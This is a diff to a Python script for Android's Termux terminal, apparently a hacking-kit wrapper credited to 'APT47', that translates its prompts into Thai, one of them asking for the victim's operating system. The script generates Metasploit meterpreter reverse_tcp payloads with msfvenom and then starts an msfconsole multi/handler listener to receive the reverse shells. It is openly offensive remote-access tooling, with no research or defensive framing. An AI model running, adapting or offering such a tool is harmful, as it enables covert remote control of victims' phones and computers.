@@ -25,21 +25,24 @@ os.system ("neofetch --ascii_distro Windows10 --logo")
 os.system ("cat /data/data/com.termux/files/home/METASEC/python.txt | lolcat")
 os.system ("figlet -f slant PHP | lolcat")
 print
-print " BY : APT47 "
+print " โดย : APT47 "
 print
-la = raw_input ("android/python/php/windows : ")
-ip = raw_input ("IP : ")
-port = raw_input ("PORT : ")
-out = raw_input ("OUTPUT : ")
+la = raw_input ("(ระบบปฏิบัติการของเหยื่อ)android/python/php/windows : ")
+ip = raw_input ("ไอพี : ")
+port = raw_input ("พอร์ท : ")
+out = raw_input ("ที่จัดเก็บ payload : ")
 os.system ("msfvenom -p %s/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s" % (la, ip, port, out))
+time.sleep(3)
+print " สร้าง payload เสร็จสิ้น กรุณารอ เพื่อไปหน้า exploit "
+time.sleep(3)
 os.system ("clear")
 os.system ("cat /data/data/com.termux/files/home/METASEC/exploit.txt | lolcat")
 print
-print " PROGRAM BY APT47 "
+print " โปรแกรมโดย APT47 "
 print
 la = raw_input ("android/python/php/windows : ")
-ip = raw_input ("IP : ")
-port = raw_input ("PORT : ")
+ip = raw_input ("ไอพี : ")
+port = raw_input ("พอร์ท : ")
 os.system ("msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD %s/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; exploit;'" % (la, ip, port,))
 
 
